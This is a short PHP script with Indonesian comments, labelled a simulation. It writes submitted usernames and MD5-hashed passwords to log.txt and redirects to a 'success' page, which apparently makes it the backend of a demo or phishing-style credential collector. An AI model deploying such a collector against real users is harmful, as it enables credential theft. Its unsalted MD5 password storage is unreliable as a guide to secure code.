<?php
// Data dari form
$username = htmlspecialchars($_POST['username']);
$password = md5(htmlspecialchars($_POST['password']));

// Simpan data ke file log (simulasi saja)
$file = fopen("log.txt", "a");
fwrite($file, "Email: $username, Password: $password\n");
fclose($file);

// Redirect ke halaman "berhasil"
header("Location: berhasil.html");
exit;
?>